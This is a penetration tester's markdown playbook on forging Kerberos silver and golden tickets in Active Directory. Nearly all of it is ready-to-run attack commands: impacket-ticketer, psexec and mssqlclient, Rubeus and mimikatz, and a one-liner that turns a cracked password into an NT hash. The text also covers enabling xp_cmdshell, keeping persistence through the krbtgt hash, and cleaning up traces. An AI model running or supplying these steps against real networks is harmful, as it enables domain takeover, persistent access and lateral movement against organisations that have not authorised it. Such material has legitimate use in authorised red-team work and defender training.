# Golden and silver tickets

## Before I start
sudo ntpdate <DCIP>
- [ ] KRB_AP_ERR_SKEW on any line below: the clock again, right before it
- [ ] Silver needs one service account's NT hash and never touches the DC; golden needs the krbtgt hash, which means I already own the domain
- [ ] Both need the domain SID: :Pb domain-enum, or the line below
impacket-lookupsid '<Domain>/<Username>:<Password>@<DCIP>'
- [ ] Domain SID is S-1-5-21-...: that is <DomainSID>, without a trailing -<RID>

## The service account's NT hash, for a silver ticket
Cracking a service account with :Pb kerberoasting gives the plaintext, not the hash. Silver wants the NT hash:
python3 -c 'import hashlib;print(hashlib.new("md4","THE-CRACKED-PASSWORD".encode("utf-16le")).hexdigest())'
- [ ] This is the account that runs the service: its hash signs the ticket
- [ ] A computer account's hash works too, for a silver ticket to that host's own services

## Silver ticket: one service, no DC
Forge a ticket to one SPN as administrator, signed by the service account's hash. The DC never sees it.
impacket-ticketer -nthash THE-SERVICE-HASH -domain-sid <DomainSID> -domain <Domain> -spn cifs/<Hostname>.<Domain> administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass '<Domain>/administrator@<Hostname>.<Domain>'
- [ ] administrator need not exist: the service trusts the PAC in the ticket, which forges Domain Admins, and never asks the DC
- [ ] The SPN is the service I forge for: cifs for psexec and smbexec, http for WinRM, host for a scheduled task
- [ ] -k wants the host's FQDN, never its IP

## Silver ticket to MSSQL
impacket-ticketer -nthash THE-SERVICE-HASH -domain-sid <DomainSID> -domain <Domain> -spn mssqlsvc/<Hostname>.<Domain>:1433 administrator
export KRB5CCNAME=administrator.ccache
impacket-mssqlclient -k -no-pass '<Domain>/administrator@<Hostname>.<Domain>'
- [ ] enable_xp_cmdshell, then xp_cmdshell whoami: :Pb mssql for the rest

## Golden ticket: the whole domain, once I have the krbtgt hash
The krbtgt hash comes from a DCSync or the NTDS.dit, so this is persistence over a domain I already took: it outlives a reset of any one account.
impacket-ticketer -nthash THE-KRBTGT-HASH -domain-sid <DomainSID> -domain <Domain> administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass '<Domain>/administrator@<DCHost>'
- [ ] This administrator ticket is a TGT for anyone: swap the name, it still signs
- [ ] The domain can rotate krbtgt and kill the ticket: take a fresh hash while I still have DCSync, :Pb acl-abuse

## From a Windows shell
Rubeus.exe from my own tools, into upload/ for serve. /ptt drops the ticket straight into my session.
.\Rubeus.exe silver /service:cifs/<Hostname>.<Domain> /rc4:THE-SERVICE-HASH /user:administrator /domain:<Domain> /sid:<DomainSID> /ptt
.\Rubeus.exe golden /rc4:THE-KRBTGT-HASH /user:administrator /domain:<Domain> /sid:<DomainSID> /ptt
- [ ] mimikatz does golden the same way: kerberos::golden /user:administrator /domain:<Domain> /sid:<DomainSID> /krbtgt:THE-KRBTGT-HASH /ptt
- [ ] mimikatz does silver as that golden command with /target:<Hostname>.<Domain> /service:cifs /rc4:THE-SERVICE-HASH
- [ ] Loaded with /ptt: dir \\<Hostname>.<Domain>\c$ to prove it, then :Pb lateral-movement for the exec

## Clean up and next
- [ ] The .ccache files removed and the variable cleared: unset KRB5CCNAME
- [ ] Every hash from a DCSync kept and tried across the domain: :Pb lateral-movement
- [ ] A silver ticket was enough for the one host; for the domain it is the krbtgt hash or a DCSync: :Pb acl-abuse
